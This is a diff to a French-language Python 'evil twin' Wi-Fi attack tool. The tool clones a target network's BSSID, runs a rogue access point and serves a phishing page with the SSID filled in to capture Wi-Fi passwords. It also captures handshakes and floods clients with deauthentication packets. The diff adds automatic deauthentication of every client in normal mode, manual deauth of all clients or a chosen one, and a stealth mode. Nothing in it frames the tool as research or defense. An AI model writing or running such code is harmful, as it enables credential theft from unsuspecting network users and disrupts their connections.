@@ -3,14 +3,15 @@
 
 """
 EVIL TWIN ULTIME - JATHNIEL EDITION
+✅ Page de phishing moderne avec SSID dynamique
 ✅ Auto-installation des dépendances
 ✅ Menu CLI interactif
-✅ Page de phishing moderne avec SSID dynamique
 ✅ Scan WiFi réel
 ✅ Création AP avec airbase-ng (BSSID cloné)
 ✅ Serveur de capture HTTP
-✅ Déauthentification (mode monitor vérifié)
-✅ Mode stealth
+✅ Déauthentification automatique (Normal Mode)
+✅ Déauthentification manuelle (tous ou ciblé)
+✅ Mode stealth (pas de deauth auto)
 ✅ Jamming sélectif
 ✅ Handshake capture
 """
@@ -106,7 +107,7 @@ def check_dependencies():
         print("   sudo apt-get install aircrack-ng macchanger")
         sys.exit(1)
 
-# ==================== PAGE PHISHING HTML ====================
+# ==================== PAGE HTML MODERNE ====================
 
 PHISHING_HTML = """<!DOCTYPE html>
 <html lang="fr">
@@ -761,7 +762,6 @@ class PhishingServer:
         if self.running:
             return
         
-        # Mettre à jour le HTML avec le SSID
         global PHISHING_HTML
         PHISHING_HTML = PHISHING_HTML.replace("{SSID}", self.ssid)
         
@@ -906,8 +906,9 @@ class EvilTwinEngine:
         
         if stealth:
             self._enable_stealth()
+            self.log("🕵️ Mode stealth activé - pas de deauth automatique")
         
-        # Créer le serveur phishing avec le SSID
+        # 1. Serveur phishing avec le SSID
         self.phishing_server = PhishingServer(
             port=8080, 
             password_callback=self.on_password_captured, 
@@ -915,10 +916,24 @@ class EvilTwinEngine:
         )
         self.phishing_server.start()
         
+        # 2. Point d'accès
         self.start_ap()
+        
+        # 3. IP Forwarding
         self.enable_ip_forwarding()
+        
+        # 4. iptables
         self.setup_iptables()
+        
+        # 5. Capture handshake
         self.start_handshake_capture()
+        
+        # 6. Deauth automatique (sauf mode stealth)
+        if not stealth:
+            self.log("📡 Déauthentification automatique de tous les clients...")
+            self.deauth_attack()
+        else:
+            self.log("🕵️ Mode stealth: pas de deauth automatique")
     
     def _enable_stealth(self):
         self.log("🕵️ Mode stealth activé")
@@ -983,7 +998,11 @@ class EvilTwinEngine:
             self.log("⚠️ BSSID non défini")
             return
         
-        self.log(f"📡 Deauth {'ciblée sur ' + target_mac if target_mac else 'tous les clients'}")
+        if target_mac:
+            self.log(f"📡 Deauth ciblée sur {target_mac}")
+        else:
+            self.log("📡 Deauth tous les clients")
+        
         try:
             cmd = ['sudo', 'aireplay-ng', '-0', '0', '-a', self.bssid]
             if target_mac:
@@ -991,7 +1010,7 @@ class EvilTwinEngine:
             cmd.append(self.monitor_interface or self.interface)
             process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             self.processes.append(process)
-            self.log(f"✅ Attaque de déauth lancée")
+            self.log("✅ Attaque de déauth lancée")
         except Exception as e:
             self.log(f"❌ Erreur: {e}")
     
@@ -1081,10 +1100,10 @@ class EvilTwinCLI:
 │                                                                      │
 │  [1] 🔍 Scanner les réseaux WiFi                                    │
 │  [2] 🎯 Sélectionner une cible                                      │
-│  [3] 🚀 Lancer l'attaque (Mode Normal)                             │
-│  [4] 🕵️ Lancer l'attaque (Mode Stealth)                            │
-│  [5] 📡 Lancer Deauth (tous les clients)                           │
-│  [6] 🎯 Lancer Deauth (ciblé)                                      │
+│  [3] 🚀 Lancer l'attaque (Mode Normal) - Deauth auto              │
+│  [4] 🕵️ Lancer l'attaque (Mode Stealth) - Pas de deauth           │
+│  [5] 📡 Lancer Deauth (tous les clients) - Manuel                 │
+│  [6] 🎯 Lancer Deauth (ciblé) - Manuel                            │
 │  [7] 👥 Voir les clients connectés                                 │
 │  [8] 🔑 Voir les mots de passe capturés                            │
 │  [9] 🤝 Voir les handshakes capturés                               │
@@ -1177,7 +1196,10 @@ class EvilTwinCLI:
         
         mode = "Stealth" if stealth else "Normal"
         print(f"✅ Attaque lancée en mode {mode}")
-        print(f"📡 SSID cloné: {net['ssid']}")
+        if stealth:
+            print("🕵️ Mode stealth: pas de deauth automatique")
+        else:
+            print("📡 Deauth automatique lancé sur tous les clients")
     
     def deauth_all(self):
         self.engine.deauth_attack()
